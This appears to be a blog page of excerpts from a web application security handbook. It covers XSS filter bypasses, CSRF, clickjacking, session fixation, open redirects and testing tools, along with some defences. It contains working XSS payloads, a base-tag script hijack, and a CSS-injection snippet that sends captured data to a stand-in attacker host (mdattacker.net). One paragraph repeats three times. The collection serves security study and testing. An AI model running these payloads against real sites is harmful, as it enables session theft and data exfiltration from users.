+    <p>Going further within tag names, if you modify the example slightly, you can use arbitrary tag names to introduce event handlers, thereby bypassing filters that merely block specific named tags: &lt;x onclick=alert(1) src=a&gt;Click here&lt;/x&gt;</p>
+    <hr class="chill" />
+    <p>The &lt;base&gt; tag is used to specify a URL that the browser should use to resolve any relative URLs that appear subsequently within the page. If you can introduce a new &lt;base&gt; tag, and the page performs any &lt;script&gt; includes after your reflection point using relative URLs, you can specify a base URL to a server that you control. When the browser loads the scripts specified in the remainder of the HTML page, they are loaded from the server you specified, yet they are still executed in the context of the page that has invoked them. For example: &lt;base href=&quot;http://mdattacker.net/badscripts/&quot;&gt; ...  &lt;script src=&quot;goodscript.js&quot;&gt;&lt;/script&gt;</p>
+    <hr class="chill" />
+    <p>Several characters can replace the space between the tag name and the first attribute name: &lt;img/onerror=alert(1) src=a&gt; &lt;img[%09]onerror=alert(1) src=a&gt; &lt;img[%0d]onerror=alert(1) src=a&gt; &lt;img[%0a]onerror=alert(1) src=a&gt; &lt;img/&quot;onerror=alert(1) src=a&gt; &lt;img/&#39;onerror=alert(1) src=a&gt; &lt;img/anyjunk/onerror=alert(1) src=a&gt; Note that even where an attack does not require any tag attributes, you should always try adding some superfluous content after the tag name, because this bypasses some simple filters: &lt;script/anyjunk&gt;alert(1)&lt;/script&gt;</p>
+    <hr class="chill" />
+    <p>Switching around the attributes in the preceding example provides a further way to bypass some filters that check for attribute names starting with on. If the filter is unaware that backticks work as attribute delimiters, it treats the following example as containing a single attribute, whose name is not that of an event handler: &lt;img src=‘a’onerror=alert(1)&gt;</p>
+    <hr class="chill" />
+    <p>Because the browser HTML-decodes the attribute value before processing it further, you can use HTML encoding to obfuscate your use of script code, thereby evading many filters. For example, the following attack bypasses many filters seeking to block use of the JavaScript pseudo-protocol handler: &lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29; &gt;</p>
+    <hr class="chill" />
+    <p>When using HTML encoding, it is worth noting that browsers tolerate various deviations from the specifications, in ways that even filters that are aware of HTML encoding issues may overlook. You can use both decimal and hexadecimal format, add superfluous leading zeros, and omit the trailing semicolon.</p>
+    <hr class="chill" />
+    <p>something similar can happen when an application framework “translates” unusual Unicode characters into their nearest ASCII equivalents based on the similarity of their glyphs or phonetics. For example, the following input uses Unicode double-angle quotation marks (%u00AB and %u00BB) instead of tag brackets: «img onerror=alert(1) src=a»</p>
+    <hr class="chill" />
+    <p>Some input filters identify HTML tags by simply matching opening and closing angle brackets, extracting the contents, and comparing this to a blacklist of tag names. In this situation, you may be able to bypass the filter by using superfluous brackets, which the browser tolerates: &lt;&lt;script&gt;alert(1);//&lt;&lt;/script&gt;</p>
+    <hr class="chill" />
+    <p>If the dot character is being blocked, you can use other methods to perform dereferences: &lt;script&gt;alert(document[‘cookie’])&lt;/script&gt; &lt;script&gt;with(document)alert(cookie)&lt;/script&gt;</p>
+    <hr class="chill" />
+    <p>if you find that the backslash character is also being properly escaped, but angle brackets are returned unsanitized, you can use the following attack: &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p>
+    <hr class="chill" />
+    <p>It is possible to send near-arbitrary data cross-domain within the HTTP request body by using an HTML form with the enctype attribute set to text/plain.</p>
+    <hr class="chill" />
+    <p>To do this, you split the data into two chunks, before and after the equals sign. You place the first chunk into a parameter name and the second chunk into a parameter value. When the browser constructs the request, it sends the two chunks separated by an equals sign, thereby exactly constructing the required data.</p>
+    <hr class="chill" />
+    <p>When examining this functionality, the first thing you should do is try to upload a simple HTML file containing a proof-of-concept script. If the file is accepted, try to download the file in the usual way. If the original file is returned unmodified, and your script executes, the application is certainly vulnerable.</p>
+    <hr class="chill" />
+    <p>when devising the input and output validation logic itself, great care should be taken to avoid any vulnerabilities that lead to bypasses. In particular, filtering and encoding should be carried out after any relevant canonicalization, and the data should not be further canonicalized afterwards. The application should also ensure that the presence of any NULL bytes does not interfere with its validation.</p>
+    <hr class="chill" />
+    <p>Wherever possible, applications should avoid using client-side scripts to process DOM data and insert it into the page.</p>
+    <hr class="chill" />
+    <p>The standard defense against CSRF attacks is to supplement HTTP cookies with additional methods of tracking sessions. This typically takes the form of additional tokens that are transmitted via hidden fields in HTML forms. When each request is submitted, in addition to validating session cookies, the application verifies that the correct token was received in the form submission. Assuming that the attacker has no way to determine the value of this token, he cannot construct a cross-domain request that succeeds in performing the desired action.</p>
+    <hr class="chill" />
+    <p>To deliver the key trick of having the victim user see one interface but interact with a different one, the attacker can employ various CSS techniques. The iframe that loads the target interface can be made an arbitrary size, in an arbitrary location within the attacker&#39;s page, and showing an arbitrary location within the target page. Using suitable style attributes, it can be made completely transparent so that the user cannot see it.</p>
+    <hr class="chill" />
+    <p>A useful explanation of these and other attack vectors, and the methods by which they may be delivered, can be found here: http://ui-redressing.mniemietz.de/uiRedressing.pdf</p>
+    <hr class="chill" />
+    <p>A more robust method for an application to prevent an attacker from framing its pages is to use the X-Frame-Options response header. It was introduced with Internet Explorer 8 and has since been implemented in most other popular browsers. The X-Frame-Options header can take two values. The value deny instructs the browser to prevent the page from being framed, and sameorigin instructs the browser to prevent framing by third-party domains.</p>
+    <hr class="chill" />
+    <p>When analyzing any antiframing defenses employed within an application, always review any related versions of the interface that are tailored for mobile devices. For example, although wahh-app.com/chat/ might defend robustly against framing attacks, there may be no defenses protecting wahh-app.com/mobile/chat/.</p>
+    <hr class="chill" />
+    <p>This response obviously contains HTML. Surprisingly, however, some browsers allow this response to be loaded as a CSS stylesheet and happily process any CSS definitions it contains.</p>
+    <hr class="chill" />
+    <p>To exploit this behavior, an attacker needs to host a page on his own domain that includes the injected response as a CSS stylesheet. This causes any embedded CSS definitions to be applied within the attacker&#39;s own page. These can then be queried using JavaScript to retrieve the captured data. For example, the attacker can host a page containing the following: &lt;link rel=&quot;stylesheet&quot; href=&quot;https://wahh-mail.com/inbox&quot; type=&quot;text/css&quot;&gt; &lt;script&gt;    document.write(‘&lt;img src=&quot;http://mdattacker.net/capture?’ +  escape(document.body.currentStyle.fontFamily) + ‘&quot;&gt;’); &lt;/script&gt;</p>
+    <hr class="chill" />
+    <p>Hence, in the course of probing the application for XSS vulnerabilities, you should also identify any locations where the application may be vulnerable to header injection</p>
+    <hr class="chill" />
+    <p>If it is possible to inject arbitrary headers and message body content into the response, this behavior can be used to attack other users of the application in various ways.</p>
+    <hr class="chill" />
+    <p>Output validation—Every piece of data being inserted into headers should be filtered to detect potentially malicious characters. In practice, any character with an ASCII code below 0x20 should be regarded as suspicious, and the request should be rejected.</p>
+    <hr class="chill" />
+    <p>An active man-in-the-middle attack (for example, against users on a public wireless network) can be used to set cookies for arbitrary domains, even if the targeted application uses only HTTPS and its cookies are flagged as secure. This kind of attack is described in more detail later in this chapter.</p>
+    <hr class="chill" />
+    <p>In a standard session hijacking attack, the attacker must use some means to capture the session token of an application user. In a session fixation attack, on the other hand, the attacker first obtains an anonymous token directly from the application and then uses some means to fix this token within a victim&#39;s browser. After the user has logged in, the attacker can use the token to hijack the user&#39;s session.</p>
+    <hr class="chill" />
+    <p>Several application servers accept use of their session tokens within the URL, delimited by a semicolon. In some applications this is done by default, and in others, the application tolerates explicit use in this manner even if the servers don&#39;t behave in this way by default: http://wahh-app.com/store/product.do;jsessionid=739105723F7AEE6ABC2 13F812C184204.ASTPESD2 If the application uses hidden fields in HTML forms to transmit session tokens, the attacker may be able to use a CSRF attack to introduce his token into the user&#39;s browser.</p>
+    <hr class="chill" />
+    <p>Some web applications and web servers accept arbitrary tokens submitted by users, even if these were not previously issued by the server itself. When an unrecognized token is received, the server simply creates a new session for it and handles it exactly as if it were a new token generated by the server.</p>
+    <hr class="chill" />
+    <p>When an application or server behaves in this way, attacks based on session fixation are made considerably easier because the attacker does not need to take any steps to ensure that the tokens fixed in target users&#39; browsers are currently valid. The attacker can simply choose an arbitrary token and distribute it as widely as possible (for example, by e-mailing a URL containing the token to individual users, mailing lists, and so on).</p>
+    <hr class="chill" />
+    <p>When an application or server behaves in this way, attacks based on session fixation are made considerably easier because the attacker does not need to take any steps to ensure that the tokens fixed in target users&#39; browsers are currently valid. The attacker can simply choose an arbitrary token and distribute it as widely as possible (for example, by e-mailing a URL containing the token to individual users, mailing lists, and so on).</p>
+    <hr class="chill" />
+    <p>When an application or server behaves in this way, attacks based on session fixation are made considerably easier because the attacker does not need to take any steps to ensure that the tokens fixed in target users&#39; browsers are currently valid. The attacker can simply choose an arbitrary token and distribute it as widely as possible (for example, by e-mailing a URL containing the token to individual users, mailing lists, and so on). Then the attacker can periodically poll a protected page</p>
+    <hr class="chill" />
+    <p>The application issues an anonymous session token to each unauthenticated user. When the user logs in, no new token is issued. Instead, her existing session is upgraded to an authenticated session. This behavior is common when the application uses the application server&#39;s default session-handling mechanism.</p>
+    <hr class="chill" />
+    <p>The application does not issue tokens to anonymous users, and a token is issued only following a successful login. However, if a user accesses the login function using an authenticated token and logs in using different credentials, no new token is issued. Instead, the user associated with the previously authenticated session is changed to the identity of the second user.</p>
+    <hr class="chill" />
+    <p>Obtain a valid token by whatever means the application enables you to obtain one. 2. Access the login form, and perform a login using this token. 3. If the login is successful and the application does not issue a new token, it is vulnerable to session fixation.</p>
+    <hr class="chill" />
+    <p>Obtain a session token as a completely anonymous user, and then walk through the process of submitting sensitive data, up until any page at which the sensitive data is displayed back. 2. If the same token originally obtained can now be used to retrieve the sensitive data, the application is vulnerable to session fixation. 3. If any type of session fixation is identified, verify whether the server accepts arbitrary tokens it has not previously issued. If it does, the vulnerability is considerably easier to exploit over an extended period.</p>
+    <hr class="chill" />
+    <p>The application should not accept arbitrary session tokens that it does not recognize as having issued itself. The token should be immediately canceled within the browser, and the user should be returned to the application&#39;s start page.</p>
+    <hr class="chill" />
+    <p>A common instance of this is when an application forces users whose sessions have expired to return to the login page and then redirects them to the original URL following successful reauthentication. If you encounter this type of behavior, the application may be vulnerable to a redirection attack, and you should investigate further to determine whether the behavior is exploitable.</p>
+    <hr class="chill" />
+    <p>Sometimes, the application may verify that the user-supplied string either starts with or contains an absolute URL to its own domain name. In this situation, the following bypasses may be effective: http://mdsec.net.mdattacker.net http://mdattacker.net/?http://mdsec.net http://mdattacker.net/%23http://mdsec.net</p>
+    <hr class="chill" />
+    <p>JavaScript can be used to perform a brute-force exercise to discover third-party sites recently visited by the user and queries he has performed on popular search engines. This technique was already described in the context of performing a brute-force attack to identify valid anti-CSRF tokens that are in use on a different domain. The attack works by dynamically creating hyperlinks for common websites and search queries and by using the getComputedStyle API to test whether the link is colorized as visited or not visited. A huge list of possible targets can be quickly checked with minimal impact on the user.</p>
+    <hr class="chill" />
+    <p>Following a successful port scan to identify other hosts, a malicious script can attempt to fingerprint each discovered service and then attack it in various ways. Many web servers contain image files located at unique URLs. The following code checks for a specific image associated with a popular range of DSL routers: &lt;img src=&quot;http://192.168.1.1/hm_icon.gif&quot; onerror=&quot;notNetgear()&quot;&gt;</p>
+    <hr class="chill" />
+    <p>To overcome this obstacle, the attacker can induce a user to load the same page over HTTPS by modifying any HTTP response to cause a redirection or by rewriting the targets of links in another response. When the user loads the help page over HTTPS, her browser performs the specified script include using HTTP. Crucially, some browsers do not display any warnings in this situation. The attacker can then return his arbitrary script code in the response for the included script. This script executes in the context of the HTTPS response, allowing the attacker to compromise this and further content that is accessed over HTTPS.</p>
+    <hr class="chill" />
+    <p>You might think that a security-paranoid user would be safe from this technique. Suppose the user accesses only one website at a time and restarts his browser before accessing each new site. Suppose he logs in to his banking application, which uses pure HTTPS, from a clean new browser. Can he be compromised by an active man-in-the-middle attack? The disturbing answer is that yes, he probably can be compromised. Today&#39;s browsers make numerous plain HTTP requests in the background, regardless of which domains the user visits. Common examples include antiphishing lists, version pings, and requests for RSS feeds. An attacker can respond to any of these requests with a redirection to the targeted domain using HTTP. When the browser silently follows the redirection, one of the attacks already described can be delivered, first to compromise the HTTP origin for the targeted domain, and then to escalate this compromise into the HTTPS origin.</p>
+    <hr class="chill" />
+    <p>Testing each case manually would be time-consuming and mind-numbing and could leave a large part of the attack surface neglected.</p>
+    <hr class="chill" />
+    <p>The application&#39;s login function returns informative messages that disclose whether a failed login was the result of an unrecognized username or incorrect password. By iterating through a list of common usernames and attempting to log in using each one, you can narrow down the list to those that you know to be valid. This list can then be used as the basis for a password-guessing attack.</p>
+    <hr class="chill" />
+    <p>If the session tokens generated by the application can be predicted, you may be able to hijack other users&#39; sessions simply by extrapolating from a series of tokens issued to you. Depending on the reliability of this process, you may need to test a large number of candidate tokens for each valid value that is confirmed.</p>
+    <hr class="chill" />
+    <p>Occasionally, the actual contents of the server&#39;s response may be identical when valid and invalid parameters are submitted, but the time taken to return the response may differ subtly. For example, when an invalid username is submitted to a login function, the application may respond immediately with a generic, uninformative message. However, when a valid username is submitted, the application may perform various back-end processing to validate the supplied credentials, some of which is computationally intensive, before returning the same message if the credentials are incorrect.</p>
+    <hr class="chill" />
+    <p>The response length frequently is a strong indicator of anomalous responses that merit further investigation. As in the preceding case, a different response length can point to interesting differences that you may not have anticipated when you devised the attack. Therefore, even if another attribute provides a reliable indicator of hits, such as the HTTP status code, you should always inspect the response length column to identify other interesting responses.</p>
+    <hr class="chill" />
+    <p>When you are probing the application for common vulnerabilities by submitting crafted attack strings in different parameters, always monitor the application&#39;s responses to identify any error messages that may contain useful information. Attempt to force an error response from the application by supplying encrypted data strings in the wrong context, or by performing actions on resources that are not in the correct state to handle the action. 2. Be aware that error information that is returned within the server&#39;s response may not be rendered on-screen within the browser. An efficient way to identify many error conditions is to search each raw response for keywords that are often contained in error messages. For example:  error exception illegal invalid fail stack access directory file not found varchar ODBC SQL SELECT 3. When you send a series of requests modifying parameters within a base request, check whether the original response already contains any of the keywords you are looking for to avoid false positives. 4. You can use the Grep function of Burp Intruder to quickly identify any occurrences of interesting keywords in any of the responses generated by a given attack (see Chapter 14). Where matches are found, review the relevant responses manually to determine whether any useful error information has been returned.</p>
+    <hr class="chill" />
+    <p>An example of the first problem is the Dump Servlet included in Jetty version 7.0.0. This servlet can be accessed from a URL such as /test/jsp/dump.jsp. When it is accessed, it prints various details of the Jetty installation and the current request, including the request query string. This allows for simple cross-site scripting if an attacker simply includes script tags in the URL, such as /test/jsp/dump.jsp?%3Cscript%3Ealert(%22xss%22)%3C/script%</p>
+    <hr class="chill" />
+    <p>Wappalyzer uncovers technologies in use on the current page, showing an icon for each one found in the URL bar.</p>
+    <hr class="chill" />
+    <p>Over the years, the humble intercepting proxy has evolved into a number of highly functional tool suites, each containing several interconnected tools designed to facilitate the common tasks involved in attacking a web application. Several testing suites are commonly used by web application security testers: Burp Suite WebScarab Paros Zed Attack Proxy Andiparos Fiddler CAT Charles</p>
+    <hr class="chill" />
+    <p>Nikto is useful for locating default or common third-party content that exists on a web server. It contains a large database of files and directories, including default pages and scripts that ship with web servers, and third-party items such as shopping cart software. The tool essentially works by requesting each item in turn and detecting whether it exists.</p>
+    <hr class="chill" />
+    <p>Hydra enables you to specify the target URL, the relevant request parameters, word lists for attacking the username and password fields, and details of the error message that is returned following an unsuccessful login.</p>
+    <hr class="chill" />
+</article>
+
+      </div>
+    </div>
+    </div>
+
+        <div class="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_config = function () {
+        var slug = "stuttard-dafydd-the-web-application-hackers-handbook";
+        this.page.url = "http://sandymaguire.me/blog/" + slug;
+        this.page.identifier = slug;
+    };
+    (function() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://danglinggazpacho.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>
+      Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+    </noscript>
+
+    </div>
+    </div>
+  </body>
+</html>
+
